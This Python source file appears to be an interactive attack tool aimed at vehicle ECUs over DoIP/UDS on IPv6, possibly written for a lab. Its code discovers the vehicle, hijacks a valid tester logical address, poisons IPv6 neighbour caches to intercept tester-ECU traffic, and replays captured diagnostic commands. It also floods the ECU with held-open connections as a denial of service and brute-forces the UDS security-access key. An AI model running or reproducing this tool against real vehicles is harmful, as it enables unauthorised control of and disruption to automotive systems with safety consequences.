"""
doip_attacker.py
DoIP (IPv6) and UDS attack logic.
"""
import socket
import struct
import time
import threading
import os
import sys
import select
import asyncio
from typing import Optional
from scapy.all import *
# UDPATED IMPORT:
from attack_config import *
# Import everything from doip_utils (external dependency)
from doip_utils import *
# Suppress Scapy warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
class DoIPAttacker:
    def __init__(self):
        self._stop_event = threading.Event()
        self.all_seen_hashes = set()
        self.all_packets = []

        # State
        self.stolen_la = None
        self.target_ip = None
        self.ecu_la = None
        self.tcp_socket = None
        self.auto_keepalive = False
        self.last_keepalive_sent = time.time()

        # Lists
        self.dids_list = []
        self.rids_list = []
        self.pids_list = []
    def load_existing(self):
        if os.path.exists(PCAP_FILE):
            try:
                existing = rdpcap(PCAP_FILE)
                for p in existing:
                    h = hash(bytes(p))
                    if h not in self.all_seen_hashes:
                        self.all_seen_hashes.add(h)
                        self.all_packets.append(p)
                print(f"{Colors.Y}[+] Loaded {len(existing)} packets → {len(self.all_packets)} unique{Colors.W}")
            except Exception as e:
                print(f"{Colors.R}[-] Could not read pcap: {e}{Colors.W}")
    def live_callback(self, pkt):
        if pkt.haslayer(Ether) and pkt[Ether].src == ATTACKER_MAC:
            return  # Skip forwarded packets sent by us
        h = hash(bytes(pkt))
        if h in self.all_seen_hashes:
            return
        self.all_seen_hashes.add(h)
        self.all_packets.append(pkt)
        if not pkt.haslayer(IPv6):
            return
        src = pkt[IPv6].src
        dst = pkt[IPv6].dst
        if pkt.haslayer(UDP):
            if pkt[UDP].dport != DOIP_PORT and pkt[UDP].sport != DOIP_PORT:
                return
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
            proto = "UDP"
            raw_load = bytes(pkt[UDP].payload)
        elif pkt.haslayer(TCP):
            if pkt[TCP].dport != DOIP_PORT and pkt[TCP].sport != DOIP_PORT:
                return
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            proto = "TCP"
            raw_load = bytes(pkt[TCP].payload)
        else:
            return
        if len(raw_load) < 8:
            return
        try:
            version = raw_load[0]
            inverse_version = raw_load[1]
            payload_type = struct.unpack('!H', raw_load[2:4])[0]
        except:
            return
        if version != 0x02 or inverse_version != 0xFD:
            return
        doip_type_str = f"0x{payload_type:04X}"
        details = ""
        uds_hex = ""
        if payload_type == 0x8001 and len(raw_load) >= 12:
            sa, ta = struct.unpack('!HH', raw_load[8:12])
            details = f"SA=0x{sa:04X} TA=0x{ta:04X}"
            if len(raw_load) > 12:
                uds_data = raw_load[12:]
                uds_hex = " ".join(f"{b:02X}" for b in uds_data)
                sid = uds_data[0]
                if sid == 0x3E:
                    uds_hex = Colors.G + uds_hex + Colors.W
                elif sid == 0x27:
                    uds_hex = Colors.Y + uds_hex + Colors.W
                elif sid == 0x22:
                    uds_hex = Colors.C + uds_hex + Colors.W
                elif sid == 0x31:
                    uds_hex = Colors.M + uds_hex + Colors.W
                elif sid >= 0x40:
                    uds_hex = Colors.G + uds_hex + Colors.W
        arrow = "→"
        print(f"{Colors.C}[{proto}]{Colors.W} {src}:{sport} {arrow} {dst}:{dport} | DoIP {doip_type_str} {details}")
        if uds_hex:
            print(f" UDS → {uds_hex}")
    def get_mac_ipv6(self, ip):
        try:
            mac = getmacbyip6(ip)
            if mac:
                return mac
            else:
                # Fallback: send Neighbor Solicitation and wait for Advertisement
                ns = IPv6(dst=ip) / ICMPv6ND_NS(tgt=ip)
                na = sr1(ns, timeout=2, verbose=0)
                if na and na.haslayer(ICMPv6ND_NA):
                    return na[Ether].src
        except:
            pass
        return "ff:ff:ff:ff:ff:ff"
    def ndp_spoof_thread(self, spoof_target: str, victim_ip: str, victim_mac: str):
        print(f"{Colors.Y}[SPOOF] Poisoning {victim_ip} → {spoof_target} is at {ATTACKER_MAC}{Colors.W}")

        # Calculate solicited-node multicast address for the spoof_target
        # Last 24 bits of IPv6 address → ff02::1:ffXX:XXXX
        last_24 = ":".join(spoof_target.split(":")[-3:])
        solicited_multicast_mac = "33:33:ff:" + last_24.replace(":", ":")

        # Build the unsolicited NA packet
        na_pkt = (
            Ether(src=ATTACKER_MAC, dst=solicited_multicast_mac) /
            IPv6(src=spoof_target, dst="ff02::1", hlim=255) /
            ICMPv6ND_NA(tgt=spoof_target, R=0, S=0, O=1) /   # O=1 is critical (Override existing entry)
            ICMPv6NDOptDstLLAddr(lladdr=ATTACKER_MAC)       # Correct option type
        )

        while not self._stop_event.is_set():
            try:
                sendp(na_pkt, iface=INTERFACE, verbose=0)
            except Exception as e:
                pass  # Silent on send errors
            time.sleep(1.0)  # 1 second interval — keeps cache poisoned reliably
            
    def impersonate_and_sniff(self):
        if not self.target_ip:
            print(f"{Colors.R}[-] Discover ECU first (run 'd'){Colors.W}")
            return

        TESTER_IP6 = 'fd00::40'  # Adjust only if your tester uses different IP
        tester_mac = self.get_mac_ipv6(TESTER_IP6)
        ecu_mac = self.get_mac_ipv6(self.target_ip)

        if tester_mac == "ff:ff:ff:ff:ff:ff" or ecu_mac == "ff:ff:ff:ff:ff:ff":
            print(f"{Colors.R}[-] Failed to resolve MACs. Check connectivity or run get_mac_ipv6 manually.{Colors.W}")
            return

        duration = int(input(f"{Colors.C}Duration (seconds, default 30) → {Colors.W}") or "30")
        print(f"\n{Colors.G}[+] Starting bidirectional NDP MitM for {duration}s...{Colors.W}")
        print(f"    Tester ({TESTER_IP6}) and ECU ({self.target_ip}) will route through attacker.\n")

        self._stop_event.clear()

        # Poison both directions
        t1 = threading.Thread(target=self.ndp_spoof_thread,
                              args=(self.target_ip, TESTER_IP6, tester_mac), daemon=True)
        t2 = threading.Thread(target=self.ndp_spoof_thread,
                              args=(TESTER_IP6, self.target_ip, ecu_mac), daemon=True)
        t1.start()
        t2.start()

        def forward_callback(pkt):
            self.live_callback(pkt)  # Log/capture it

            if pkt.haslayer(Ether) and pkt[Ether].dst == ATTACKER_MAC and pkt.haslayer(IPv6):
                # Determine forward destination MAC
                if pkt[IPv6].dst == self.target_ip:
                    fwd_mac = ecu_mac
                elif pkt[IPv6].dst == TESTER_IP6:
                    fwd_mac = tester_mac
                else:
                    return  # Ignore unrelated

                # Change Ether headers
                pkt[Ether].dst = fwd_mac
                pkt[Ether].src = ATTACKER_MAC

                # CRITICAL: Recalculate IPv6 and TCP fields
                try:
                    del pkt[IPv6].plen   # Force recalc of payload length
                    if pkt.haslayer(TCP):
                        del pkt[TCP].chksum  # Force recalc using new IPv6 pseudo-header
                    if pkt.haslayer(UDP):
                        del pkt[UDP].chksum
                except:
                    pass

                sendp(pkt, iface=INTERFACE, verbose=0)

        try:
            sniff(iface=INTERFACE,
                  prn=forward_callback,
                  filter=f"tcp port {DOIP_PORT} or udp port {DOIP_PORT}",
                  timeout=duration,
                  store=False)
        except KeyboardInterrupt:
            pass

        self._stop_event.set()
        t1.join(timeout=3)
        t2.join(timeout=3)

        print(f"\n{Colors.G}[+] MitM stopped. {len(self.all_packets)} unique packets captured.{Colors.W}")
        wrpcap(PCAP_FILE, self.all_packets)
        print(f"{Colors.G}    Saved → {os.path.abspath(PCAP_FILE)}{Colors.W}")

    def list_mode(self):
        if not os.path.exists(PCAP_FILE):
            print(f"{Colors.R}[-] No capture file yet — run 'sniff' first{Colors.W}")
            return
        pkts = rdpcap(PCAP_FILE)
        print(f"\n{Colors.C}{Colors.BOLD}=== CAPTURED DoIP/UDS PACKETS: {len(pkts)} ==={Colors.W}")
        print(f"{'No':>4} {'Proto':<5} {'Source':<36} → {'Dest':<36} {'DoIP Type':<12} {'UDS Payload (hex)'}")
        print("─" * 140)

        for i, p in enumerate(pkts):
            proto = "UDP" if p.haslayer(UDP) else "TCP" if p.haslayer(TCP) else "?"
            src = f"{p[IPv6].src}:{p.sport}" if p.haslayer(IPv6) else "?"
            dst = f"{p[IPv6].dst}:{p.dport}" if p.haslayer(IPv6) else "?"
            raw_load = bytes(p[Raw]) if Raw in p else b''
            doip_type = "N/A"
            uds_hex = ""
            color = Colors.W

            if len(raw_load) >= 8 and raw_load[0] == 0x02 and raw_load[1] == 0xFD:
                doip_type = f"0x{struct.unpack('!H', raw_load[2:4])[0]:04X}"
                if doip_type == "0x8001" and len(raw_load) >= 12:
                    uds_data = raw_load[12:]
                    if uds_data:
                        uds_hex = " ".join(f"{b:02X}" for b in uds_data)
                        sid = uds_data[0]
                        # Color based on SID only (no names)
                        if sid == 0x3E:
                            color = Colors.G
                        elif sid == 0x27:
                            color = Colors.Y
                        elif sid == 0x22:
                            color = Colors.C
                        elif sid == 0x31:
                            color = Colors.M
                        elif sid >= 0x40:
                            color = Colors.G

            # Main line: ONLY raw hex code, big and clear
            print(f"{color}{i:4d}{Colors.W} {proto:<5} {src:<36} → {dst:<36} {doip_type:<12} {uds_hex or 'N/A'}")

        print("─" * 140)

    def replay_mode(self):
        if not self.tcp_socket:
            print(f"{Colors.R}[-] Must be connected first (run 's' to connect with stolen LA).{Colors.W}")
            return

        if not os.path.exists(PCAP_FILE):
            print(f"{Colors.R}[-] No capture file.{Colors.W}")
            return

        pkts = rdpcap(PCAP_FILE)
        self.list_mode()

        choice = input(f"\n{Colors.Y}Packets to replay (e.g. 5 or 3-10 or 1,4,7) → {Colors.W}").strip()
        indices = []
        for part in choice.replace(" ", "").split(","):
            if "-" in part:
                try:
                    a, b = map(int, part.split("-"))
                    indices.extend(range(a, b + 1))
                except:
                    continue
            else:
                try:
                    indices.append(int(part))
                except:
                    continue

        to_send = [pkts[i].copy() for i in indices if 0 <= i < len(pkts)]
        if not to_send:
            print(f"{Colors.R}[-] No valid packets selected.{Colors.W}")
            return

        uds_commands = []
        for pkt in to_send:
            raw_load = bytes(pkt[Raw]) if Raw in pkt else b''
            if len(raw_load) >= 12 and raw_load[0:2] == b'\x02\xfd' and raw_load[2:4] == b'\x80\x01':
                uds_data = raw_load[12:]
                if uds_data:
                    uds_commands.append(uds_data)
                    print(f"{Colors.C}[EXTRACTED UDS] {uds_data.hex().upper()}{Colors.W}")

        if not uds_commands:
            print(f"{Colors.R}[-] No valid UDS payloads found.{Colors.W}")
            return

        times = int(input(f"{Colors.C}Spam times (default 1) → {Colors.W}") or "1")
        print(f"\n{Colors.G}[REPLAY via TCP] Sending {len(uds_commands)} UDS command(s) × {times}...{Colors.W}")

        for _ in range(times):
            for uds in uds_commands:
                print(f"{Colors.Y}[SENDING] {uds.hex().upper()}{Colors.W}")
                resp = self.send_uds(uds)
                if resp:
                    print(f"{Colors.M}[RESPONSE] {resp.hex().upper()}{Colors.W}")
                time.sleep(0.5)

        print(f"{Colors.G}[+] REPLAY COMPLETE (via valid TCP session){Colors.W}")
        
    def do_discovery(self):
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind((MY_IP6, 0))
        sock.settimeout(3.0)
        print("\n[d] Performing UDP Vehicle Discovery (IPv6)...")
        sock.sendto(create_header(TYPE_VEHICLE_ID_REQ, 0), (BROADCAST_IP6, DOIP_PORT))
        try:
            data, addr = sock.recvfrom(1024)
            p_type, _, payload = parse_header(data)
            if p_type != TYPE_VEHICLE_ID_RES:
                print(f"[-] Unexpected response type: 0x{p_type:04X}")
                return
            entity = parse_vehicle_announcement(payload)
            if not entity:
                print("[-] Failed to parse announcement.")
                return

            self.target_ip = addr[0]
            if '%' in self.target_ip: self.target_ip = self.target_ip.split('%')[0]
            self.ecu_la = entity['logical_addr']
            print("[+] Discovery SUCCESS!")
            print(f" ECU IP : {self.target_ip}")
            print(f" ECU Logical Addr : 0x{self.ecu_la:04X}")
            print(f" VIN : {entity.get('vin', 'N/A')}")
        except socket.timeout:
            print("[-] Timeout – no vehicle responded.")
            self.target_ip = self.ecu_la = None
        finally:
            sock.close()
    def enumerate_la(self):
        if not self.target_ip:
            print("[-] Discover ECU first with 'd'")
            return
        print("\n=== Enumerating Tester Logical Addresses ===")
        found = False
        for la in range(0x0E00, 0x0F00):
            print(f"Trying LA 0x{la:04X}...", end=" ")
            sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            sock.bind((MY_IP6, 0))
            sock.settimeout(2.0)
            try:
                sock.connect((self.target_ip, DOIP_PORT))
                payload = struct.pack('!HBL', la, 0, 0)
                sock.send(create_header(TYPE_ROUTING_ACTIVATION_REQ, len(payload)) + payload)
                data = sock.recv(1024)
                _, _, body = parse_header(data)
                code = body[4]
                if code == 0x10:
                    print(f"\n[SUCCESS] Valid LA found: 0x{la:04X}")
                    self.stolen_la = la
                    found = True
                    break
                else:
                    print(f"Rejected (0x{code:02X})")
            except Exception:
                print("Failed")
            finally:
                sock.close()
            time.sleep(0.05)
        if not found:
            print("\n[-] No valid LA found.")
    def do_connect(self):
        if self.stolen_la is None:
            print("[-] No stolen LA. Run 'l' to enumerate first.")
            return
        if not self.target_ip:
            print("[-] No ECU discovered (run 'd' first).")
            return
        if self.tcp_socket:
            print("[!] Already connected (run 't' first).")
            return
        print(f"\n[s] Connecting TCP to {self.target_ip}:{DOIP_PORT} (IPv6)...")
        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        sock.bind((MY_IP6, 0))
        try:
            sock.connect((self.target_ip, DOIP_PORT))
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return
        print("[s] Sending Routing Activation with stolen LA...")
        act_payload = struct.pack('!HBL', self.stolen_la, 0, 0)
        sock.send(create_header(TYPE_ROUTING_ACTIVATION_REQ, len(act_payload)) + act_payload)
        try:
            data = sock.recv(1024)
            _, _, body = parse_header(data)
            code = body[4]
            if code == 0x10:
                print("[+] Routing Activation SUCCESS")
                sock.setblocking(0)
                self.tcp_socket = sock
            else:
                print(f"[-] Activation failed (0x{code:02X})")
                sock.close()
        except Exception as e:
            print(f"[-] Activation error: {e}")
            sock.close()
    def send_uds(self, uds_bytes: bytes):
        if not self.tcp_socket or self.ecu_la is None:
            print("[-] Not connected or no ECU LA.")
            return None
        payload = struct.pack('!HH', self.stolen_la, self.ecu_la) + uds_bytes
        try:
            self.tcp_socket.sendall(create_header(TYPE_DIAGNOSTIC_MESSAGE, len(payload)) + payload)
        except Exception as e:
            print(f"[-] Send error: {e}")
            return None
        self.tcp_socket.setblocking(1)
        self.tcp_socket.settimeout(2.0)
        try:
            data = self.tcp_socket.recv(4096)
            p_type, _, body = parse_header(data)
            if p_type == 0x8002:
                sa, ta = struct.unpack('!HH', body[:4])
                uds_resp = body[4:]
                print(f"Response: {uds_resp.hex().upper()}")
                return uds_resp
            else:
                print(f"[!] Unexpected DoIP type 0x{p_type:04X}")
                return None
        except socket.timeout:
            print("Response: TIMEOUT")
            return None
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
        finally:
            self.tcp_socket.setblocking(0)
    def do_disconnect(self):
        if not self.tcp_socket:
            print("[!] No active connection.")
            return
        print("\n[t] Closing TCP connection...")
        try:
            self.tcp_socket.close()
        except:
            pass
        self.tcp_socket = None
        self.auto_keepalive = False
        print("[+] Disconnected.")
    def did_enumeration(self):
        if not self.tcp_socket:
            print("[-] Not connected. Run 's' first.")
            return
        print("\n[*] Starting DID Enumeration (0x22 F100-F1FF)...")
        self.dids_list = []
        for did in range(0xF100, 0xF200):
            payload = b'\x22' + struct.pack('!H', did)
            resp = self.send_uds(payload)
            if resp is None:
                continue
            if len(resp) >= 3 and resp[0] == 0x62 and resp[1:3] == struct.pack('!H', did):
                data = resp[3:]
                print(f"[+] DID 0x{did:04X} → SUPPORTED | {data.hex().upper()}")
                self.dids_list.append((did, "supported"))
            elif len(resp) >= 3 and resp[:3] == b'\x7F\x22\x33':
                print(f"[?] DID 0x{did:04X} → SECURITY REQUIRED (7F 22 33)")
                self.dids_list.append((did, "security_required"))
            elif len(resp) >= 3 and resp[:2] == b'\x7F\x22':
                nrc = resp[2]
                print(f"[-] DID 0x{did:04X} → NEGATIVE (7F 22 {nrc:02X})")
            time.sleep(0.01)
        if self.dids_list:
            print("\nList:")
            for did, status in self.dids_list:
                status_text = "READABLE" if status == "supported" else "SEC REQ"
                print(f" 0x{did:04X} → {status_text}")
    def rid_enumeration(self):
        if not self.tcp_socket:
            print("[-] Not connected. Run 's' first.")
            return
        print("\n[*] Starting RID Enumeration (0x31 01 1200-13FF)...")
        self.rids_list = []
        for rid in range(0x1200, 0x1400):
            payload = b'\x31\x01' + struct.pack('!H', rid)
            resp = self.send_uds(payload)
            if resp is None:
                continue
            if len(resp) >= 4 and resp[:4] == b'\x71\x01' + struct.pack('!H', rid):
                result = resp[4:] if len(resp) > 4 else b''
                print(f"[+] RID 0x{rid:04X} → STARTABLE | {result.hex().upper()}")
                self.rids_list.append((rid, "startable"))
            elif len(resp) >= 3 and resp[:3] == b'\x7F\x31\x33':
                print(f"[?] RID 0x{rid:04X} → SECURITY REQUIRED (7F 31 33)")
                self.rids_list.append((rid, "security_required"))
            elif len(resp) >= 3 and resp[:2] == b'\x7F\x31':
                pass
            time.sleep(0.01)
        if self.rids_list:
            print("\nList:")
            for rid, status in self.rids_list:
                status_text = "STARTABLE" if status == "startable" else "SEC REQ"
                print(f" 0x{rid:04X} → {status_text}")
    def pid_enumeration(self):
        if not self.tcp_socket:
            print("[-] Not connected. Run 's' first.")
            return
        print("\n[*] Starting PID Enumeration (Mode 01 00-FF)...")
        self.pids_list = []
        for pid in range(0x00, 0x100):
            payload = b'\x01' + struct.pack('B', pid)
            resp = self.send_uds(payload)
            if resp is None:
                continue
            if resp[:2] == b'\x41':
                data = resp[1:]
                print(f"[+] PID 0x{pid:02X} → SUPPORTED | {data.hex().upper()}")
                self.pids_list.append(pid)
            time.sleep(0.01)
        print(f"\n[+] PID Enumeration complete. Found {len(self.pids_list)} supported PIDs:")
        print(" " + " ".join(f"0x{p:02X}" for p in self.pids_list))
    def dos_attack(self, duration=15, max_threads=200):
        if not self.target_ip:
            print("[-] No ECU IP discovered.")
            return
        print(f"\n[!] Starting PERSISTENT DoS ({max_threads} threads, {duration}s)...")
        print(" Connections held open after activation → exhausts ECU resources\n")
        def hold_connection():
            s = None
            try:
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                s.bind((MY_IP6, 0))
                s.settimeout(5.0)
                s.connect((self.target_ip, DOIP_PORT))
                payload = struct.pack('!HBL', self.stolen_la or 0x0E00, 0, 0)
                s.sendall(create_header(TYPE_ROUTING_ACTIVATION_REQ, len(payload)) + payload)
                print(f" [+] Thread held connection open")
                time.sleep(duration + 10)
            except Exception as e:
                pass
            finally:
                if s: s.close()
        threads = []
        for i in range(max_threads):
            t = threading.Thread(target=hold_connection, daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.02)
        print(f" Launched {len(threads)} persistent connections")
        time.sleep(duration)
        print("\n[!] DoS complete. Legitimate tester should have been blocked.")
    def brute_force_attack(self):
        KEY_MIN = 0x11222000
        KEY_MAX = 0x11222FFF
        KEY_LENGTH = 4
        print("[BRUTE] Requesting seed (27 01)...")
        seed_resp = self.send_uds(bytes([0x27, 0x01]))
        if seed_resp is None:
            print("[BRUTE] No response to seed request.")
            return
        print(f"[BRUTE] Seed response: {seed_resp.hex().upper()}")
        if not (len(seed_resp) >= 3 and seed_resp[0] == 0x67 and seed_resp[1] == 0x01):
            print("[BRUTE] Unexpected or negative seed response.")
            return
        seed_bytes = seed_resp[2:]
        actual_key_len = len(seed_bytes)
        if actual_key_len != KEY_LENGTH:
            print(f"[BRUTE] Warning: Seed length {actual_key_len} bytes – adjusting key length.")
            KEY_LENGTH = actual_key_len
        print(f"[BRUTE] Seed: {seed_bytes.hex().upper()} (length={KEY_LENGTH} bytes)")
        print(f"[BRUTE] Starting brute force from 0x{KEY_MIN:08X} to 0x{KEY_MAX:08X}")
        attempts = 0
        start_time = time.time()
        for k in range(KEY_MIN, KEY_MAX + 1):
            key_bytes = k.to_bytes(KEY_LENGTH, byteorder="big")
            payload = bytes([0x27, 0x02]) + key_bytes
            resp = self.send_uds(payload)
            attempts += 1
            if attempts % 50 == 0:
                elapsed = time.time() - start_time
                print(f"[BRUTE] Attempts: {attempts} | Last key: 0x{k:08X} | Rate: {attempts / elapsed:.1f} att/s", end="\r")
            if resp is None: continue
            if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
                print("\n[BRUTE] SUCCESS!")
                print(f"[BRUTE] Valid key found after {attempts} attempts")
                print(f"[BRUTE] Key (int): 0x{k:0{KEY_LENGTH * 2}X}")
                print(f"[BRUTE] Key (bytes): {key_bytes.hex().upper()}")
                print(f"[BRUTE] ECU response: {resp.hex().upper()}")
                return
            if len(resp) >= 3 and resp[0] == 0x7F and resp[1] == 0x27 and resp[2] == 0x33:
                print("\n[BRUTE] ECU entered lockout mode (7F 27 33). Stopping attack.")
                return
            time.sleep(0.002)
        print("\n[BRUTE] Exhausted key range. No valid key found.")
    def print_doip_status(self):
        print("\n=== DoIP Attacker (IPv6) ===")
        print(f"Stolen LA : {'0x{:04X}'.format(self.stolen_la) if self.stolen_la else 'None (run l)'}")
        print(f"ECU IP : {self.target_ip or 'Not discovered (run d)'}")
        print(f"ECU LA : {'0x{:04X}'.format(self.ecu_la) if self.ecu_la else 'Unknown'}")
        print(f"TCP : {'CONNECTED' if self.tcp_socket else 'DISCONNECTED'}")
        print(f"Keep-alive: {'ON' if self.auto_keepalive else 'OFF'}")
        print(f"Captured packets: {len(self.all_packets)}")
        print("\nCommands:")
        print(" d = discover ECU || s = connect || t = disconnect")
        print(" l = enumerate LA || e/x = keep-alive on/off")
        print(" ed = did enum || er = rid enum || ep = pid enum")
        print(" dos = denial of service || b = brute force")
        print(" sniff = impersonate + sniff (NDP) || list = show captured packets")
        print(" replay = capture tester sequence and replay with attacker IP")
        print(" q = back to main menu")
        print(" <hex> = send UDS command")
        print(">", end=" ", flush=True)
    async def run(self):
        self.load_existing()
        print("=== DoIP UDS Attacker with Sniffing (IPv6) ===\n")
        self.print_doip_status()
        while True:
            if self.auto_keepalive and self.tcp_socket:
                now = time.time()
                if now - self.last_keepalive_sent >= KEEPALIVE_INTERVAL:
                    try:
                        payload = struct.pack('!HH', self.stolen_la, self.ecu_la) + AUTO_KEEPALIVE_SERVICE
                        self.tcp_socket.sendall(create_header(TYPE_DIAGNOSTIC_MESSAGE, len(payload)) + payload)
                        print(f"\n→ 3E 80 auto keep-alive ({now:.1f}s)")
                        self.last_keepalive_sent = now
                    except:
                        print("\n[-] Failed to send keep-alive")
            if select.select([sys.stdin], [], [], 0.05)[0]:
                line = sys.stdin.readline().strip()
                if not line: continue
                cmd = line.lower()
                if cmd in ("d", "l", "s", "t", "e", "x", "q", "ed", "er", "ep", "dos", "b", "sniff", "list", "replay"):
                    if cmd == "q":
                        if self.tcp_socket: self.tcp_socket.close()
                        break
                    elif cmd == "d": self.do_discovery()
                    elif cmd == "l": self.enumerate_la()
                    elif cmd == "s": self.do_connect()
                    elif cmd == "t": self.do_disconnect()
                    elif cmd == "e":
                        self.auto_keepalive = True
                        self.last_keepalive_sent = time.time() - KEEPALIVE_INTERVAL + 0.5
                        print("\n[+] Auto keep-alive ENABLED")
                    elif cmd == "x":
                        self.auto_keepalive = False
                        print("\n[+] Auto keep-alive DISABLED")
                    elif cmd == "ed": self.did_enumeration()
                    elif cmd == "er": self.rid_enumeration()
                    elif cmd == "ep": self.pid_enumeration()
                    elif cmd == "dos": self.dos_attack()
                    elif cmd == "b": self.brute_force_attack()
                    elif cmd == "sniff": self.impersonate_and_sniff()
                    elif cmd == "list": self.list_mode()
                    elif cmd == "replay": self.replay_mode()
                else:
                    cleaned = line.replace(" ", "").replace("0x", "").upper()
                    if len(cleaned) % 2 == 0 and all(c in "0123456789ABCDEF" for c in cleaned):
                        uds_bytes = bytes.fromhex(cleaned)
                        pairs = [cleaned[i:i + 2] for i in range(0, len(cleaned), 2)]
                        print(f"\n{' '.join(pairs)} → sent")
                        self.send_uds(uds_bytes)
                    else:
                        print("\n[-] Invalid hex")
                self.print_doip_status()
            await asyncio.sleep(0.01)
